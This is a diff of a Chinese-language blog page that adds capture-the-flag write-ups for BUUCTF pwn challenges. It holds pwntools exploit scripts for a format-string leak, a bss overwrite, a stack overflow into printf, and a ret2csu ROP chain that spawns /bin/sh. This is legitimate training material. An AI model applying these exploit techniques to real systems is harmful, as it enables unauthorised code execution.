@@ -92,7 +92,22 @@
 <meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/pwn5_1.png">
 <meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/pwn5_2.png">
 <meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/pwn5_3.png">
-<meta property="og:updated_time" content="2020-02-07T10:20:55.074Z">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/ciscn_2019_n_8_1.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/ciscn_2019_n_8_2.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/not_the_same_3dsctf_2016_1.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/not_the_same_3dsctf_2016_2.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/not_the_same_3dsctf_2016_3.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/ciscn_s_3_1.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/ciscn_s_3_2.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/ciscn_s_3_3.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/ciscn_s_3_4.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/ciscn_s_3_5.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/ciscn_s_3_6.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/ciscn_s_3_7.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/ciscn_s_3_8.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/ciscn_s_3_9.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/ciscn_s_3_10.png">
+<meta property="og:updated_time" content="2020-02-15T05:07:24.737Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BUUCTF pwn做题记录">
 <meta name="twitter:description" content="BUUCTF pwn做题记录">
@@ -356,8 +371,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-02-07T18:20:55+08:00">
-                2020-02-07
+              <time title="更新于" itemprop="dateModified" datetime="2020-02-15T13:07:24+08:00">
+                2020-02-15
               </time>
             
           </span>
@@ -438,6 +453,79 @@
 <p>最终的exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment"># sh = remote('node3.buuoj.cn', 25471)</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">pd_address = <span class="number">0x0804c044</span></span><br><span class="line">payload = <span class="string">'%12$s'</span> + <span class="string">'A'</span> * <span class="number">3</span> + p32(pd_address)</span><br><span class="line">sh.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = u32(sh.recvline()[<span class="number">6</span>:<span class="number">10</span>])</span><br><span class="line"><span class="comment"># log.success(str(data))</span></span><br><span class="line"><span class="keyword">if</span> data &gt; <span class="number">2</span>**<span class="number">31</span><span class="number">-1</span>:</span><br><span class="line">    data = data - <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">sh.sendline(str(data))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>注意u32解包出来的是无符号整型，对负数结果需要另外处理</p>
+<h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>老套路，32位程序，ida查看</p>
+<img src="/2020/02/05/BUUCTFpwn/ciscn_2019_n_8_1.png">
+<p>逻辑比较简单，只需要保证var[13]的值等于17即可</p>
+<p>注意到var变量是在bss段中的dword类型的变量，所以payload要以4字节为单位</p>
+<img src="/2020/02/05/BUUCTFpwn/ciscn_2019_n_8_2.png">
+<p>而ida中的QWORD，等价于一次强制类型转换，将int转换为long long</p>
+<p>所以exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">sh = process(<span class="string">'./ciscn_2019_n_8'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">13</span> * <span class="number">4</span> + p32(<span class="number">17</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>注意变量的类型，payload会因此而改变</p>
+<h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>32位程序，ida查看<br><img src="/2020/02/05/BUUCTFpwn/not_the_same_3dsctf_2016_1.png"></p>
+<p>明显的溢出点，再在ida中查找可以利用的函数</p>
+<img src="/2020/02/05/BUUCTFpwn/not_the_same_3dsctf_2016_2.png">
+<p>发现secret函数将flag写入了一个bss段的全局变量里，所以我们可以考虑将这个变量输出来获得flag。</p>
+<p>发现程序中并没有puts函数，于是利用printf函数。</p>
+<p>再从所有字符串中查找含有%s的可利用的格式化字符串</p>
+<img src="/2020/02/05/BUUCTFpwn/not_the_same_3dsctf_2016_3.png">
+<p>这里我随意选取了0x1a处的字符串</p>
+<p>然后构造payload输出flag即可</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"><span class="comment"># sh = remote('node3.buuoj.cn', 27089)</span></span><br><span class="line">sh = process(<span class="string">'./not_the_same_3dsctf_2016'</span>)</span><br><span class="line"><span class="comment"># elf = ELF('./not_the_same_3dsctf_2016')</span></span><br><span class="line">func_address = <span class="number">0x080489A0</span></span><br><span class="line">flag_address = <span class="number">0x080ECA2D</span></span><br><span class="line">str_address = <span class="number">0x080D5543</span></span><br><span class="line">printf_address = <span class="number">0x0804F0A0</span></span><br><span class="line">exit_address = <span class="number">0x0804E660</span></span><br><span class="line"></span><br><span class="line">num = <span class="number">45</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">45</span> + p32(func_address) + p32(printf_address) + p32(exit_address) + p32(str_address) + p32(flag_address) + p32(flag_address)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>和之前的某道题相同，最后要用exit函数来刷新输出流(可能是靶场的问题，按理说有\n出现后输出流应该会被刷新才对)</p>
+<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>注意printf的构造和应用</p>
+<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>这题还是有点东西的<del>(贼麻烦)</del></p>
+<h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>64位程序，只有nx保护</p>
+<p>查看ida，<code>main</code>函数没有什么有用的东西，只能看出调用了vuln函数</p>
+<img src="/2020/02/05/BUUCTFpwn/ciscn_s_3_1.png">
+<p>再看<code>vuln</code>函数</p>
+<img src="/2020/02/05/BUUCTFpwn/ciscn_s_3_2.png">
+<p>可以看到两遍系统调用，分别调用了<code>sys_read</code>和<code>sys_write</code></p>
+<p>再没有其他可用的信息，所以我们可以考虑通过系统调用访问shell</p>
+<p>首先，系统调用<code>sys_execve</code>的条件是rax=59,rdi=’/bin/sh’,rsi=0,rdx=0</p>
+<p><a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_64.tbl" target="_blank" rel="noopener">64位的系统调用码可以查表</a></p>
+<p>其中比较难满足的是rax=59，我们先ROPgadget看看有没有可以实现的gadget</p>
+<img src="/2020/02/05/BUUCTFpwn/ciscn_s_3_3.png">
+<p>正好有mov rax 0x3b，所以执行<code>sys_execve</code>有可行性</p>
+<p>那么这个题的整体思路就是 sys_read溢出 -&gt; 修改rax -&gt; 修改rdi -&gt; 修改rsi -&gt; 修改rdx -&gt; 执行syscall</p>
+<p>首先gdb计算<code>sys_read</code>中buf的偏移，得到偏移值16</p>
+<p>我们发现程序中没有可以直接利用的<code>/bin/sh</code>字符串，所以我们只能通过<code>sys_read</code>在buf中读入。同时，为了后面利用buf，我们必须知道buf的地址。</p>
+<img src="/2020/02/05/BUUCTFpwn/ciscn_s_3_4.png">
+<p>注意到buf的位置是<code>$rsp - 10</code>，所以我们需要泄漏出rsp的地址。</p>
+<p>再回到最初的<code>vuln</code>函数，我们可以发现<code>sys_write</code>函数同样有着‘溢出’，就是多输出了栈上的东西。假如在这些多输出的数据中，存在输出一个栈上的地址，那我们就可以利用这个地址，通过计算偏移得到rsp的地址。</p>
+<p>gdb中跑跑看，我们可以惊喜的发现存在这种情况(注意要si进入vuln函数，否则无法查看vuln函数的栈帧)</p>
+<img src="/2020/02/05/BUUCTFpwn/ciscn_s_3_5.png">
+<p>在执行完sys_write后，我门查看栈空间，发现<code>$rsp</code>和<code>$rsp+16</code>都是存放着一个栈上的地址。<code>$rsp</code>就是return address,我们需要进行覆写，无法利用，所以我们可以利用<code>$rsp+16</code>。泄露出栈地址后，我们需要让程序重新执行，所以构造初始exp如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line"><span class="comment"># sh = remote('node3.buuoj.cn', 26505)</span></span><br><span class="line">gdb.attach(sh)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">num = <span class="number">16</span></span><br><span class="line">start_addr = <span class="number">0x4003E0</span></span><br><span class="line">payload = <span class="string">'A'</span> * num + p64(start_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行exp,我们发现输出的<code>[0x20:0x28]</code>部分就是我们需要的地址</p>
+<img src="/2020/02/05/BUUCTFpwn/ciscn_s_3_6.png">
+<p>接下来就是计算这个地址和<code>rsp</code>的偏移。</p>
+<p>值得注意的是，我们<code>rsp</code>的地址是会发生改变的，所以为了得到<code>/bin/sh</code>的地址，我们需要计算的是泄露地址和第二次执行程序时<code>rsp</code>的地址的偏移。我们可以暂时先放一放，等到构造完payload后再求。</p>
+<p>我们继续寻找修改<code>rdi</code>, <code>rsi</code>, <code>rdx</code>的gadget。</p>
+<p>分别可以找到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_addr = <span class="number">0x4005a3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x4005a1</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br></pre></td></tr></table></figure>
+<p>比较棘手的是<code>rdx</code>。我们只能找到这样一段可利用的代码</p>
+<img src="/2020/02/05/BUUCTFpwn/ciscn_s_3_7.png">
+<p>为此我们需要控制的寄存器有<code>r12</code>和<code>r13</code>。所以还需要额外的gadget</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop_r12_r13_14_15_addr = <span class="number">0x40059C</span> <span class="comment"># pop r12 r13 14 15 ret</span></span><br></pre></td></tr></table></figure>
+<p>注意到修改<code>rdx</code>的代码段也修改了rdi和rsi，所以我们需要优先处理<code>rdx</code>的值。</p>
+<p><code>r13</code> <code>r14</code> <code>r15</code>的值都可以置为零，但是<code>r12</code>的值不能为零，因为<code>0x400589</code>处有<code>call qword ptr [r12+rbx*8]</code>。所以我们需要将<code>r12</code>的值置为一个栈地址(因为有一层解引用)</p>
+<p>于是我们目前构造payload为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + p64(mov_rax_addr) <span class="comment"># 满足偏移16</span></span><br><span class="line">payload += p64(pop_r12_r13_14_15_addr) + p64(stack_addr - <span class="number">8</span>) + p64(<span class="number">0x0</span>) * <span class="number">3</span> <span class="comment"># 修改r12 r13 r14 r15</span></span><br><span class="line">payload += p64(mov_rdx_addr)</span><br></pre></td></tr></table></figure>
+<p>这样call的时候就是执行<code>mov_rax_addr</code>处的代码</p>
+<p>但是这样还不够，因为mov_rdx_addr处的代码是一个循环，<code>rbx</code>和<code>rbp</code>显然是不能相等的，所以程序会执行第二次call，而这次的地址是<code>$r12+8</code>，也就是再一次执行pop_r12_r13_14_15。为了跳出这个循环，我们必须更改栈结构，控制return address。在call的时候，会执行<code>push rip</code>，所以我们可以少输入一个值，再加上一个return address。 即<code>payload += p64(0x0) * 3 +  p64(pop_rdi_addr)</code>。栈结构如图</p>
+<img src="/2020/02/05/BUUCTFpwn/ciscn_s_3_8.png" title="call前栈顶前四个元素">
+<img src="/2020/02/05/BUUCTFpwn/ciscn_s_3_9.png" title="call后栈顶前四个元素">
+<p>这样，执行完pop r12 r13 r14 r15后就会跳转到pop_rdi_addr。</p>
+<p>最麻烦的问题解决了，后面就是简单的构造rop链了。最后的payload为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + p64(mov_rax_addr)</span><br><span class="line">payload += p64(pop_r12_r13_14_15_addr) + p64(stack_addr - <span class="number">8</span>) + p64(<span class="number">0x0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(mov_rdx_addr) +  p64(<span class="number">0x0</span>) * <span class="number">3</span> +  p64(pop_rdi_addr) + p64(stack_addr - <span class="number">16</span>) + p64(<span class="number">0x400517</span>)</span><br></pre></td></tr></table></figure>
+<p>我们前面跳过了一步，就是求<code>rsp</code>在第二次程序执行时的地址。我们直接在<code>vuln</code>函数结束处下断点，等到第二次执行时查看rsp地址即可。</p>
+<img src="/2020/02/05/BUUCTFpwn/ciscn_s_3_10.png">
+<p>得到偏移为504</p>
+<p>所以最后的exp为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">sh = process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh, 'b* 0x400519')</span></span><br><span class="line">elf = ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">num = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x4005a3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">mov_rax_addr = <span class="number">0x4004e2</span> <span class="comment"># mov rax, 0x3b ; ret</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x4005a1</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">mov_rdx_addr = <span class="number">0x400580</span> <span class="comment"># mov rdx, r13</span></span><br><span class="line">pop_r12_r13_14_15_addr = <span class="number">0x40059C</span> <span class="comment"># pop r12 r13 14 15 ret</span></span><br><span class="line">start_addr = <span class="number">0x4003E0</span></span><br><span class="line">payload = <span class="string">'A'</span> * num + p64(start_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">stack_addr = u64(sh.recv(<span class="number">0x30</span>)[<span class="number">0x20</span>:<span class="number">0x28</span>]) - <span class="number">504</span></span><br><span class="line">log.success(hex(stack_addr))</span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + p64(mov_rax_addr)</span><br><span class="line">payload += p64(pop_r12_r13_14_15_addr) + p64(stack_addr - <span class="number">8</span>) + p64(<span class="number">0x0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(mov_rdx_addr) +  p64(<span class="number">0x0</span>) * <span class="number">3</span> +  p64(pop_rdi_addr) + p64(stack_addr - <span class="number">16</span>) + p64(<span class="number">0x400517</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>ROP链的构造还是要具体情况具体分析，注意更改栈结构来控制程序流</p>
 
       
     </div>
@@ -610,7 +698,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#get-started-3dsctf-2016"><span class="nav-number">1.</span> <span class="nav-text">get_started_3dsctf_2016</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">1.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第五空间2019-决赛-PWN5"><span class="nav-number">2.</span> <span class="nav-text">[第五空间2019 决赛]PWN5</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路-1"><span class="nav-number">2.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结-1"><span class="nav-number">2.2.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#get-started-3dsctf-2016"><span class="nav-number">1.</span> <span class="nav-text">get_started_3dsctf_2016</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">1.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第五空间2019-决赛-PWN5"><span class="nav-number">2.</span> <span class="nav-text">[第五空间2019 决赛]PWN5</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路-1"><span class="nav-number">2.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结-1"><span class="nav-number">2.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ciscn-2019-n-8"><span class="nav-number">3.</span> <span class="nav-text">ciscn_2019_n_8</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路-2"><span class="nav-number">3.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结-2"><span class="nav-number">3.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#not-the-same-3dsctf-2016"><span class="nav-number">4.</span> <span class="nav-text">not_the_same_3dsctf_2016</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路-3"><span class="nav-number">4.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结-3"><span class="nav-number">4.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ciscn-2019-s-3"><span class="nav-number">5.</span> <span class="nav-text">ciscn_2019_s_3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路-4"><span class="nav-number">5.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结-4"><span class="nav-number">5.2.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
             
 
           </div>
